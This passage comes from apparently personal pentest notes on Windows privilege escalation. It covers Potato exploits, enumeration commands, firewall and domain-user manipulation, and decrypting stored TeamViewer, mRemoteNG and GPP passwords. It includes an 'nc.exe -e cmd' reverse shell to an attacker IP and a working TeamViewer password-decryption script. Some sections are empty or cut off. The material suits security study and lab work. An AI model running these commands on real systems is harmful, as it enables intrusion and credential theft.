1. Check the permissions on the StartUp directory with accesschk.exe:

   ```text
   .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
   ```

2. The `BUILTIN\Users` group must have write access to this directory.
3. Using VBScript, create the file CreateShortcut.vbs. If necessary, change the file paths.
4. Using cscript, run the script:

   ```text
   > cscript CreateShortcut.vbs
   ```

5. Start a listener on Kali, then an admin user must log in to trigger the exploit.

### Installed Applications

The majority of privilege escalations involving installed apps are due to misconfigurations. Even so, some privilege escalation is caused through memory corruption exploits, therefore knowing how to identify installed applications and known vulnerabilities is still necessary.

#### Install Applications Commands

Manually enumerate all running programs:

```text
tasklist /v
```

We can also use Seatbelt to search for nonstandard processes:

```text
.\seatbelt.exe NonstandardProcesses
```

winPEAS also has this ability \(note the misspelling\):

```text
.\winPEASany.exe quiet procesinfo
```

We can enumerate installed applications with wmic:

```text
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

### Exploit-DB

Once you've found a process that interests you, try to figure out which version it is. You can also check the config or text files in the Program Files directory, as well as executing the executable with /? or -h. To find a corresponding exploit, use Exploit-DB. Some exploits include instructions, while others need you to compile and run code.

## Hot Potato

The term "Hot Potato" refers to an attack that combines a spoofing assault with an NTLM relay attack in order to achieve SYSTEM rights. The technique convinces Windows to use NTLM to authenticate as the SYSTEM user to a bogus HTTP server. To acquire command execution, the NTLM credentials are subsequently sent to SMB. This technique is capable of infecting Windows 7, 8, and early versions of Windows 10, as well as their server counterparts.

### Hot Potato Privilege Escalation

1. Copy the potato.exe exploit executable over to Windows. 

2. Start a listener on your host \(e.g Kali or Parrot\):

```text
nc -lvnp <PORT>
```

3. Run the potato exploit:

```text
.\potato.exe -ip 192.168.10.10 -cmd "C:\Users\Public\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

4. Wait for a Windows Defender update, or trigger one manually

## Juicy Potato

### Rotten Potato

In 2016, the original Rotten Potato flaw was discovered. A SYSTEM ticket could be intercepted by a service account and used to impersonate the SYSTEM user. Because service accounts typically have the “SeImpersonatePrivilege” ability enabled, this was conceivable.

### Juicy Potato Privilege Escalation

The exploit Rotten Potato was relatively restricted. Juicy Potato works in the same manner that Rotten Potato does, but the authors performed a lot of research and came up with a lot of new ways to use it.

{% embed url="https://github.com/ohpe/juicy-potato" %}

We can execute JuicyPotato with the following example:

```text
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443"
```

#### Error 10038

This usually happens when the CLSID is not correct. As we know with the system that we are on a Windows 10 Enterprise machine, we can look for the correct CLSID in [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) we find the corresponding CLSID, and with the parameter -c:

```text
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
```

## Common Exploits

[Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation

⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

[Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato

⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation

🙏 Works for Windows Server 2019 and Windows 10

[RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato

🙏 Works for Windows Server 2019 and Windows 10

## Network

### Port Forwarding

The susceptible program may be listening on an internal port at times \(e.g localhost\). In these circumstances, we must redirect a port on Kali to a Windows internal port.

Enumerate routing tables:

```text
route print
```

Enumerate listening ports:

```text
netstat -ano
```

Flags Explained:

* a = display all active TCP connections
* n = display address and port in numerical form
* o = display the owner PID of each connection

{% embed url="https://wixnic.gitbook.io/hacknotes/port-redirection-and-tunneling/port-redirection" %}

###  Shares

### Firewall Rules

Enumerate the firewall of our current profile with:

```text
netsh advfirewall show currentprofile
```

* State = On/Off?

Enumerate all the firewall rules:

```text
netsh advfirewall firewall show rule name=all
```

* Enable = Yes/No?
* Direction = In/Out?
* Grouping = ?
* LocalP = Any/Specific?
* RemoteIP = Any/Specific?
* Protocol = Any/Secific?
* Action = Allow/Deny?

 PowerShell One-Liner for allowing an inbound port:

```text
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock \
{New-NetFirewallRule -DisplayName setenso -RemoteAddress 10.10.14.8 -Direction inbound -Action Allow}
```

We can enum

## Users & Groups 

### Privileged Groups

### Tokens

### Logged Users / Sessions

Enumerate the users that are currently logged in:

```text
qwinsta
klist sessions
```

### Password Policy

Enumerate the password policy information with this command:

```text
 net accounts
```

### Copy the contents of the clipboard

We may be able to dump information that's on the clipboard, however, this method is easily detected by modern Anti-malware or Anti-virus:

```text
powershell -command "Get-Clipboard"
```

## Misc

### AD Recycle Bin Group

Search for deleted objects and filter for users:

```text
Get-ADObject -SearchBase "CN=Deleted Objects,DC=domain,DC=local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *`
```

### Exchange Windows Permissions

Create your own user

```text
net user username password /add /domain
```

Add the newly created user to the group Exchange Windows Permissions:

```text
net group "Exchange Windows Permissions" /add username
```

### TeamViewer

```text
PS C:\> tasklist | findstr /i 'TeamViewer'
TeamViewer_Service.exe        3048                            0     18,404 K
```

TeamViewer is a remote management software. Since this is the server, it will have credentials used for others to connect to it.

I can get the version by looking in the `\Program Files (x86)\TeamViewer`:

```text
PS C:\Program Files (x86)\TeamViewer> ls


    Directory: C:\Program Files (x86)\TeamViewer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/27/2020  10:35 AM                Version7
```

There’s a list of registry keys, and the one that looks like version 7 is `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`. For each location, it looks for the following values:

OptionsPasswordAES SecurityPasswordAES SecurityPasswordExported ServerPasswordAES ProxyPasswordAES LicenseKeyAES

I can take a look at that registry key:

```text
PS C:\Program Files (x86)\TeamViewer> cd HKLM:\software\wow6432node\teamviewer\version7
PS HKLM:\software\wow6432node\teamviewer\version7> get-itemproperty -path .


StartMenuGroup            : TeamViewer 7
InstallationDate          : 2020-02-20
InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
Always_Online             : 1
Security_ActivateDirectIn : 0
Version                   : 7.0.43148
ClientIC                  : 301094961
PK                        : {191, 173, 42, 237...}
SK                        : {248, 35, 152, 56...}
LastMACUsed               : {, 005056B9641D}
MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
MIDVersion                : 1
ClientID                  : 1769137322
CUse                      : 1
LastUpdateCheck           : 1584564540
UsageEnvironmentBackup    : 1
SecurityPasswordAES       : {255, 155, 28, 115...}
MultiPwdMgmtIDs           : {admin}
MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
Security_PasswordStrength : 3
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer\vers
                            ion7
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer
PSChildName               : version7
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry
```

`SecurityPasswordAES` is there from the list above. It just dumps a list of integers:

```text
PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
```

#### Decrypt Password

{% embed url="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/teamviewer\_passwords.rb" %}

After some research, I found that it’s using AES128 in CBC mode with a static key and iv. We can easily recreate this in a few lines of Python but we need a library which is this one:

```text
❯ pip3 install pycrypto
Defaulting to user installation because normal site-packages is not writeable
Collecting pycrypto
  Using cached pycrypto-2.6.1.tar.gz (446 kB)
Building wheels for collected packages: pycrypto
  Building wheel for pycrypto (setup.py) ... done
  Created wheel for pycrypto: filename=pycrypto-2.6.1-cp39-cp39-linux_x86_64.whl size=526405 sha256=eb0f71d1e11861ab7653b83ad0e3b0b50d37acb34e0f43641717b832ed3c6e61
  Stored in directory: /home/kali/.cache/pip/wheels/9d/29/32/8b8f22481bec8b0fbe7087927336ec167faff2ed9db849448f
Successfully built pycrypto
Installing collected packages: pycrypto
Successfully installed pycrypto-2.6.1
```

The script is as follows:

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
# Read as bytes
cipher = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
# UTF-16 because is Windows and Strip Null Bytes
password = aes.decrypt(cipher).decode("utf-16").rstrip("\x00")

print(f"[+] The password is: {password}")
```

Then we can decrypt the password.

```text
❯ python3 decrypt.py
[+] The password is: !R3m0te!
```

#### NSClient++

View and undocumented key:

```text
type nsclient.ini
```

Display password with `nscp.exe`:

```text
nscp.exe web -- password --display
```

### mRemoteNG-Decrypt

Read the password from XMLfile:

```text
type confCons.xml
```

Decrypt the password cipher text:

```text
python3 mremoteng_decrypt.py -s CIPHER
```

{% embed url="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng\_decrypt.py" %}

### Groups.xml

We can use GPP decrypt to get the password:

```text
gpp-decrypt CIPHER_HERE
```

### ExploitCapcom

### SeLoadDriverPrivilege















